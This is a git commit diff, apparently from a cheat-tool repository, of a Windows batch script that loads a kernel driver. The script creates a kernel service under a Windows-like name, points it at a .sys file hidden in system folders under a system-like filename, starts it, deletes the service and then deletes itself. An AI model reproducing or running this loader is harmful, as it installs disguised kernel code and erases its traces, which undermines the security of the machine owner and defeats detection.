f6bc650bde659cf749a7c000223aec6727ee9e46
842834fdjfgfg <109022461+TrinityCheat@users.noreply.github.com>
2025-08-02 19:32:22 +0700

    Update 7.bat

--- 7.bat
+++ 7.bat
@@ -1,6 +1,6 @@
 @echo off
 cd %~dp0
-sc create WindowsGdi binpath=C:\Windows\servicing\CbsApe.sys type=kernel
+sc create WindowsGdi binpath=C:\Windows\System32\dsc\DseCoreR.sys type=kernel
 sc start WindowsGdi
 sc delete WindowsGdi
 del "%~f0"
